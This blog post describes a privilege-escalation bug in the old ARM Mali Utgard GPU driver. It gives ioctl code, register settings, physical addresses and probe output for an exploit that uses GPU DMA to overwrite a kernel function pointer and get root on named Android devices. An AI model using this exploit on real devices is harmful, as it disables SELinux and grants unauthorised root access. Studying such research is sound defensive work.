---
published: true
title: "🗺️ [6] Unfinished Business"
toc: true
toc_sticky: true
tagline: "I wasn't satisfied with leaving some Mali Utgard devices unrooted, so I found another bug."
windowGradientStart: rgb(0, 11, 130)
windowGradientEnd: rgb(8, 0, 165)
windowBorder: rgb(0, 0, 0)
minimizeButton: rgb(47, 255, 0)
maximizeButton: rgb(255, 162, 0)
closeButton: rgb(255, 0, 0)
tags:
  - Linux Kernel Driver
  - Binary Exploitation
  - Android LPE
---

When testing the UAF used for *frels*/*minnka*, I bought a bunch of devices with Mali Utgard GPUs to write exploits (assuming they were also using a similar version of the driver), but it turns out they were using some older version that is pretty different, and not impacted by the bug. I had to put these away and forget about them for a while, but after I presented the *frels*/*minnka* research at DistrictCon Junkyard, I couldn't leave these devices to collect dust!

# Old Driver

The devices that are not impacted by the bug all have one thing in common - they are using a super old version of the driver. There are cross-overs with the newer driver (they are interacting with the same GPU of course), but the memory management layer, and various other bits, are different on the newer versions. If you want to have a look in more detail, check these out:

- [*New*](https://android.googlesource.com/kernel/amlogic-tv-modules/mali-driver/+/refs/tags/android-tv-10.0.0_r0.1/utgard/r6p2/) <- The version used on the translator, version is **r6p2**
- [*Old*](https://github.com/andi34/android_kernel_samsung_golden/tree/8a4515f155a7813c9e4fdfc303ad29badf5ac1e2/drivers/gpu/mali/mali400ko/driver/src/devicedrv/mali) <- This is the driver I audited for this blog, its for the Samsung Galaxy S5 Mini, seems to be version **r3p1**, the driver on device is **r4p0** but it matches closely to the source code I have

All that really matters for us at this point is that the UAF we cared about in the newer driver does not apply in this driver due to differences in the memory management.

![score.gif](/assets/images/translator/p7/boring.gif)

# GPU Memory Architecture (r3p1/r6p2)

Lets go over how memory works on this GPU - the GPU manages memory through a software-controlled MMU (Memory Management Unit) that is separate from the CPU's MMU (I'll refer to this as the GPU MMU). Each process that opens **/dev/mali** gets its own **mali_page_directory**. This is a two-level page table that lives in physical memory, and is pointed at by the GPU's MMU hardware register.

The Page Directory (PD) is a single 4 KB physical page allocated when the session opens. Each PDE is initially zero, and when a mapping that falls within a 4 MB region is first created, **mali_mmu_pagedir_map** allocates a page table page on demand and writes its physical address into the PDE with the **MALI_MMU_FLAGS_PRESENT** bit set:

```cpp
err = mali_mmu_get_table_page(&pde_phys, &pde_mapping);
pagedir->page_entries_mapped[i] = pde_mapping;
_mali_osk_mem_iowrite32_relaxed(pagedir->page_directory_mapped, i*sizeof(u32),
                                pde_phys | MALI_MMU_FLAGS_PRESENT);
```

Once the page table page exists, **mali_mmu_pagedir_update** writes individual PTEs for each 4 KB page, these contain the physical address plus permission bits:

```cpp
for (; mali_address < end_address;
       mali_address += MALI_MMU_PAGE_SIZE, phys_address += MALI_MMU_PAGE_SIZE)
{
    _mali_osk_mem_iowrite32_relaxed(
        pagedir->page_entries_mapped[MALI_MMU_PDE_ENTRY(mali_address)],
        MALI_MMU_PTE_ENTRY(mali_address) * sizeof(u32),
        phys_address | permission_bits);
}
```

Its worth pointing out that the PTEs contain *raw physical addresses*. The GPU MMU has no concept of ownership or IOMMU (Input-Output Memory Management Unit) protection - whoever controls the PTEs controls what physical memory the GPU reads and writes.

For **r3p1**, each session also maintains a **descriptor_mapping** table that maps opaque integer cookies (returned to userspace) to kernel **mali_memory_allocation** structs. This is how userspace later unmaps memory:

1. It hands back the cookie
2. Kernel looks up the descriptor
3. Tears down the PTEs

**r6p2** keeps this page table structure but replaces the **descriptor_mapping** cookie table with an IDR (ID Radix) and RB-tree (**mali_vma_node**) for VA (Virtual Address) tracking, and wraps physical addresses in a **mali_dma_addr** typedef to route allocations through the kernel DMA API - neither change affects the hardware page walk or the absence of IOMMU protection (which is good to know).

This difference between earlier versions (**r3p1**/**r4p0**) and **r6p2** means that the *frels*/*minnka* bug was introduced somewhere between these versions when they introduced the IDR/RB-tree to replace the cookie tracking stuff.

![yapping.png](/assets/images/translator/p7/yapping.png)

TLDR:

- GPU memory structured like this:

![gpu_mem.png](/assets/images/translator/p7/gpu_mem.png)

- Devices not vulnerable to UAF uses older driver
- Different to newer driver versions:
	- **r4p0−** : Session tracks allocations via opaque integer cookie table (**descriptor_mapping**)
	- **r6p2+** : Session tracks allocations via IDR + RB-tree (**mali_vma_node**)

![let_me_be_clear.gif](/assets/images/translator/p7/let_me_be_clear.gif)

# MAP_EXT_MEM ioctl in r3p1

**MAP_EXT_MEM** exists for situations like a camera driver or display subsystem owning a hardware buffer at a known physical address, and userspace wants the GPU to render into or read from it without a (probably slow) copy. A physical address and GPU virtual address are passed in, and the kernel creates the PTEs.

The passed struct is:

```c
typedef struct {
    void    *ctx;           // [in,out] kernel fills this in
    u32      phys_addr;     // [in]  physical address to map
    u32      size;          // [in]  length in bytes
    u32      mali_address;  // [in]  GPU VA to map it at
    u32      rights;        // [in]  access flags
    u32      flags;         // [in]  e.g. guard-page flag
    u32      cookie;        // [out] handle for later unmap
} _mali_uk_map_external_mem_s;
```

The call flows through three layers. The Linux wrapper **mem_map_ext_wrapper** copies the struct from userspace, patches in the kernel session pointer, calls the common layer, then writes the cookie back:

```c
if (0 != copy_from_user(&uk_args, argument, sizeof(_mali_uk_map_external_mem_s)))
    return -EFAULT;

uk_args.ctx = session_data;
err_code = _mali_ukk_map_external_mem(&uk_args);

put_user(uk_args.cookie, &argument->cookie);
```

The function **_mali_ukk_map_external_mem** performs the validation and descriptor setup:

```c
// Only validation of the physical address:
if (_MALI_OSK_ERR_OK != mali_mem_validation_check(args->phys_addr, args->size))
    return _MALI_OSK_ERR_FAULT;

// Store phys_addr and size for the commit callback
info[0] = args->phys_addr;
info[1] = args->size;

// Allocate memory descriptor, mali_address has no checks
descriptor->mali_address = args->mali_address;
```

The commit callback **external_memory_commit** is where the PTEs actually get written. It calls **mali_allocation_engine_map_physical** which chains into **mali_mmu_pagedir_map** + **mali_mmu_pagedir_update**, producing a live GPU mapping from **mali_address** -> **phys_addr**.

Its worth noting what is not validated - **mali_address** itself. There aren't any checks for alignment against the GPU address space, no overlap detection with existing mappings, and no range bounds. The only blocker is the physical address range check (which is going to keep things secure right?).

## Bug - Bad Memory Range in Configuration

The physical address validation lives in **mali_mem_validation_check**:

```c
_mali_osk_errcode_t mali_mem_validation_check(u32 phys_addr, u32 size)
{
    if (phys_addr < (phys_addr + size)) // overflow/zero check
    {
        if ((0 == (phys_addr & (~_MALI_OSK_CPU_PAGE_MASK))) &&
            (0 == (size     & (~_MALI_OSK_CPU_PAGE_MASK))))  // alignment check
        {
            if ((phys_addr          >= mali_mem_validator.phys_base) &&
                ((phys_addr + size - 1) <= (mali_mem_validator.phys_base
                                            + mali_mem_validator.size - 1)))
            {
                return _MALI_OSK_ERR_OK;  // accepted
            }
        }
    }
    return _MALI_OSK_ERR_FAULT;
}
```

This is a single contiguous range check against a global **_mali_mem_validation_t** that is populated during driver initialisation from a **MEM_VALIDATION** resource in the board file. On the Samsung Galaxy S5 Mini (the current focus), that range is misconfigured, and spans a much greater area than it ever should:

```
phys_base=0x40000000 size=0xb1000000 range_end=0xf0ffffff
```

Those above values were obtained by reversing kernel code to find the configured values in the validator during initialisation (via **mali_parse_config_memory**), but it was initially discovered by just trying to map various physical regions and see what happens:

```
[-] phys 0x00000000: rejected
[-] phys 0x10000000: rejected
[-] phys 0x20000000: rejected
[+] phys 0x40000000: ACCEPTED
[+] phys 0x60000000: ACCEPTED
[+] phys 0x70000000: ACCEPTED
[+] phys 0x78000000: ACCEPTED
[+] phys 0x7f000000: ACCEPTED
[+] phys 0x80000000: ACCEPTED
[+] phys 0x80100000: ACCEPTED
[+] phys 0x80800000: ACCEPTED
[+] phys 0x81000000: ACCEPTED
[+] phys 0x82000000: ACCEPTED
[+] phys 0x84000000: ACCEPTED
[+] phys 0x88000000: ACCEPTED
[+] phys 0x90000000: ACCEPTED
[+] phys 0xa0000000: ACCEPTED
[+] phys 0xb0000000: ACCEPTED
[+] phys 0xc0000000: ACCEPTED
[+] phys 0xf0000000: ACCEPTED
```

The ARM Linux kernel on this device loads at physical **0x80008000**. Every kernel code page, every kernel data page, every slab cache, and every page table page falls inside the accepted window - what else could you possibly want? The purpose of **mali_mem_validator** is to restrict callers to a pre-designated framebuffer region. In this case however, the board configuration made it very permissive to the point they may as well of not bothered.

Once **mali_mem_validation_check** returns **OK**, the driver creates PTEs without a care in the world. Any unprivileged process with an open handle to **/dev/mali** can map an arbitrary kernel physical page into the GPU address space.

![yikes.png](/assets/images/translator/p7/yikes.png)

So we are able to map kernel pages into the GPU, what can we do with that primitive?

# PP Write-back Job

*Note:* A lot of parts of the following are heavily based on the reverse engineering work done for the [Lima](https://gitlab.freedesktop.org/lima/mesa) project, it would NOT have been pleasant to reverse all of this myself.

The Mali 400 Pixel Processor (PP) is a tile-based renderer. It works through a job submitted via **PP_START_JOB** that describes a full render: what geometry to process, what shader to run, what the output dimensions are, and where to DMA the rendered output to (important!).

That last part is controlled by up to three Write-Back (WB) units. Each WB unit has a set of hardware registers that tell the PP where to write its output after a tile completes. The registers relevant to the exploit are set in the **wb0_registers** array of **pp_start_job_s**:

```c
// WB register indices
#define WB_TYPE          0   // source: color, depth, stencil
#define WB_ADDRESS       1   // destination GPU VA
#define WB_PIXEL_FORMAT  2   // e.g. RGBA8888
#define WB_PITCH         5   // row stride in bytes
#define WB_MRT_BITS      6   // bytes per pixel
```

**WB_ADDRESS** is a GPU virtual address. When the PP finishes rendering a tile, the hardware walks the session's page tables to resolve **WB_ADDRESS** to a physical address, then issues a DMA write of the rendered pixel data to that physical location.

The rendered pixel data itself is controlled by the frame registers. In particular, **FR_CLEAR_COLOR** through **FR_CLEAR_COLOR_3** set the constant background color that the fragment shader outputs when no geometry covers a pixel. With a trivial constant-output shader, the color registers determine exactly what bytes the PP writes:

```c
job.frame_registers[FR_CLEAR_COLOR]   = (uint32_t) get_root_shell;
job.frame_registers[FR_CLEAR_COLOR_1] = (uint32_t) get_root_shell;
job.frame_registers[FR_CLEAR_COLOR_2] = (uint32_t) get_root_shell;
job.frame_registers[FR_CLEAR_COLOR_3] = (uint32_t) get_root_shell;
```

With *RGBA8888* format and a *1x1* tile, the first four bytes written at **WB_ADDRESS** will be the RGBA value - which here is set to the address of a userspace function (because these devices don't have PXN!).

![might_just_work.gif](/assets/images/translator/p7/might_just_work.gif)

# Exploits

Time to exploit this bug!

## Samsung Galaxy S5 Mini

By combining the bug and the PP Write-back job, we can do the following: map any kernel physical page into the GPU VA space, point **WB_ADDRESS** at the desired offset within that mapping, set the clear-color registers to the value you want written, submit the job, and the GPU will DMA-write the chosen value to the chosen physical address. The kernel is not involved in this write at all - it happens entirely in GPU hardware after **PP_START_JOB** returns.

So we can get full kernel code execution via GPU DMA by overwriting a function pointer to point to a userspace function (no PXN), and get root.

1. Create a CPU-accessible GPU buffer

	```c
	void *data_buf = mmap(NULL, BUF_SIZE, PROT_READ | PROT_WRITE,
						MAP_SHARED, fd, GPU_VA_DATA);  // GPU VA 0x40000000
	```

	- This maps GPU VA **0x40000000** into the process address space. Writing to **data_buf** from the CPU is visible to the GPU when it reads that VA range. This is where the PP job's geometry and shader data live.

2. Map a kernel physical page into GPU VA space

	- The target is the physical page containing a known kernel function pointer. On this device, **/proc/boot_stat** has a **read** handler whose pointer lives at physical **0x80740a54** (page **0x80740000**, offset **0xa54**):

	```c
	mali_map_ext_mem_s ext_args = {
		.phys_addr    = 0x80740000,  // kernel page - passes validation
		.size         = PAGE_SIZE,
		.mali_address = 0x40030000,  // GPU VA to map it at
		.rights       = 0x37,
	};
	ioctl(fd, MALI_IOC_MEM_MAP_EXT, &ext_args);
	```

	- The bug lets this through. The driver writes a PTE: GPU VA **0x40030000** -> physical **0x80740000**. The GPU can now read and write that kernel page, which contains the function pointer we wish to attack.

3. Construct the PP job

	- A minimal render is set up in **data_buf**: a Polygon List Builder (PLB) array describing a single tile, a trivial fragment shader that outputs a constant color, and a Render State Word (RSW) tying them together. The clear-color registers are loaded with **get_root_shell**, which will perform our privesc:

	```c
	job.frame_registers[FR_CLEAR_COLOR]   = (uint32_t) get_root_shell;
	// ... all four color registers set identically
	```

	- The WB0 unit is pointed at the function pointer's location within the mapped kernel page:

	```c
	uint32_t wb_target = GPU_VA_TARGET + TARGET_PAGE_OFFSET;  // 0x40030a54

	job.wb0_registers[WB_TYPE]         = 0x02;        // color output
	job.wb0_registers[WB_ADDRESS]      = wb_target;   // GPU VA of kernel func ptr
	job.wb0_registers[WB_PIXEL_FORMAT] = 0x03;        // RGBA8888
	job.wb0_registers[WB_PITCH]        = (16 * 4) / 8;
	job.wb0_registers[WB_MRT_BITS]     = 4;
	```

4. Submit and wait

	```c
	ioctl(fd, MALI_IOC_PP_START_JOB, &job);
	ioctl(fd, MALI_IOC_WAIT_FOR_NOTIFICATION, &notif);
	```

	- The GPU renders the single tile. The PP resolves **0x40030a54** through the session page tables -> physical **0x80740a54**, and DMA-writes the RGBA value (the address of **get_root_shell**) to that location. The kernel function pointer now points into the process's address space.

5. Trigger execution

	```c
	int aee_fd = open("/proc/boot_stat", O_RDONLY);
	read(aee_fd, buffer, sizeof(buffer));
	```

	- Opening and reading **/proc/boot_stat** causes the kernel to call the **read** handler through the now-overwritten function pointer. Control transfers to **get_root_shell** in kernel context, which:

		1. Patches **sys_execve** to disable **sec_restrict_fork** (a Samsung addition that blocks uid-0 processes with non-root parents from calling **execve**)
		2. Zeroes the SELinux **enforcing** flag directly in kernel memory
		3. Calls **prepare_kernel_cred(current)** + **commit_creds** to replace the current task's credentials with uid/gid 0

		```c
		execve("/system/bin/sh", args, NULL);  // root shell
		```

The entire chain requires only an open file descriptor to **/dev/mali**, no other privileges - its a super powerful bug, and pretty easy to port to other devices.

![kort_samsung_s5_mini.gif](/assets/images/translator/p7/kort_samsung_s5_mini.gif)

![hecker.png](/assets/images/translator/p7/hecker.png)

## Amazon Fire 7 - 5th & 7th Gen

These tablets are based on the **Mediatek MT8127** chipset, which also have a Mali Utgard GPU and use this older driver version. Basically the exact same issue, with a slight difference in available addresses:

```
[-] phys 0x00000000: rejected
[-] phys 0x10000000: rejected
[-] phys 0x20000000: rejected
[-] phys 0x40000000: rejected
[-] phys 0x60000000: rejected
[-] phys 0x70000000: rejected
[-] phys 0x78000000: rejected
[-] phys 0x7f000000: rejected
[+] phys 0x80000000: ACCEPTED
[+] phys 0x80100000: ACCEPTED
[+] phys 0x80800000: ACCEPTED
[+] phys 0x81000000: ACCEPTED
[+] phys 0x82000000: ACCEPTED
[+] phys 0x84000000: ACCEPTED
[+] phys 0x88000000: ACCEPTED
[+] phys 0x90000000: ACCEPTED
[+] phys 0xa0000000: ACCEPTED
[+] phys 0xb0000000: ACCEPTED
[+] phys 0xc0000000: ACCEPTED
[+] phys 0xf0000000: ACCEPTED
```

This doesn't impact the exploit as the kernel pages are still allowed to be mapped into the GPU, so this was a nice and easy port for the 7th gen:

![kort_amazon_fire_7_7th.gif](/assets/images/translator/p7/kort_amazon_fire_7_7th.gif)

The 5th gen has the exact same behaviour:

![kort_amazon_fire_7_5th.gif](/assets/images/translator/p7/kort_amazon_fire_7_5th.gif)

## Sony Xperia E4

This device uses a **Mediatek MT6582** chipset, the mapping range appears to be identical to the **MT8127** in the Kindle Fire 7's above, so another easy port:

![kort_sony_xperia_e4.gif](/assets/images/translator/p7/kort_sony_xperia_e4.gif)

And it looks like this is Mediatek's Mali Utgard configuration:

```
mali_mem_validator: phys_base=0x80000000 size=0x80000000 range_end=0xffffffff
```

# Newer Driver

Another bug won't hurt right? The underlying code with the bug still exists on this driver (**r6p2+**), the only difference is the **ioctl** calls required to hit it.

- Steps for **r3p1**:

	1. Open **/dev/mali**
	2. **mmap** a GPU buffer into CPU address space (GPU VA **0x40000000**)
	3. **MAP_EXT_MEM** - map target kernel physical page into GPU VA space in one call
	4. Write PLB, RSW, shader, and tile block into the mmapped buffer
	5. Submit PP job with **WB_ADDRESS** pointing at the kernel function pointer's GPU VA
	6. **WAIT_FOR_NOTIFICATION**
	7. Trigger the overwritten function pointer

- Steps for **r6p2**:

	1. Open **/dev/mali**
	2. **MEM_BIND** with **bind_ext_memory** - map target kernel physical page into GPU VA space
	3. **MEM_ALLOC** - reserve GPU VA range for job data buffer
	4. **mmap** the allocated GPU buffer into CPU address space
	5. Write PLB, RSW, shader, and tile block into the mmapped buffer
	6. Submit PP job with **WB_ADDRESS** pointing at the kernel function pointer's GPU VA,
	initialising **fence.sync_fd = -1** and **timeline_point_ptr**
	7. **WAIT_FOR_NOTIFICATION**
	8. Trigger the overwritten function pointer

Other than that, the underlying bug is identical, so once the initialisation changes are made, the exploit is basically the same for both (steps 5-8).

![horizons.gif](/assets/images/translator/p7/horizons.gif)

## Exploits

I ported the exploit to a few of the *minnka*/*frels* devices just to prove its there:

- T11 Translator (where it all began, I almost feel bad at this point):

![kort_t11_translator.gif](/assets/images/translator/p7/kort_t11_translator.gif)

- Soyes XS11:

![kort_soyes_xs11.gif](/assets/images/translator/p7/kort_soyes_xs11.gif)

- Doogee X5:

![kort_doogee_x5.gif](/assets/images/translator/p7/kort_doogee_x5.gif)

- Huawei T3 7.0:

![kort_huawei_t3_7.gif](/assets/images/translator/p7/kort_sony_xperia_e4.gif)

# Conclusion

Well, I think thats everything now, I've got bugs to root basically any device that is using any version of the ARM Mali Utgard Driver, so I'm calling that a win! If anyone ever reads this I hope it is useful, and it helps in your learning and/or projects you're working on. I've really enjoyed rooting phones like its 2015 again, I wish I could go back and show old me some of this I'm sure he'd get a kick out of it.

Oh and all the code is [here](https://github.com/lr-m/RIPMaliUtgard).

![curly.gif](/assets/images/translator/p7/curly.gif)

